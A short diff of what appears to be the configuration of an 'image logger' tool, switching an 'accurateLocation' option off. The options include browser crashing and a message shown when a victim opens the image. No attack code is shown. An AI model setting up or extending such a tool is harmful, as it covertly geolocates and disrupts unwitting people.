@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, 
+    "accurateLocation": False, 
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
